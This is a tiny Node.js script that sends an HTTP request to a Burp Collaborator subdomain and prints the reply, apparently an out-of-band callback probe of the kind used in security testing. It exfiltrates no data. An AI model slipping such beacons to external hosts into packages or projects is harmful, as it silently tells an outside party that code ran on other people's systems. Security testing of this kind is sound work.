const http = require("http")

http
  .request(
    {
      hostname: "ioaswrkb6o8s5bdh76224s26dxjq7f.burpcollaborator.net",
    },
    res => {
      let data = ""

      res.on("data", d => {
        data += d
      })
      res.on("end", () => {
        console.log(data)
      })
    }
  )
  .end()
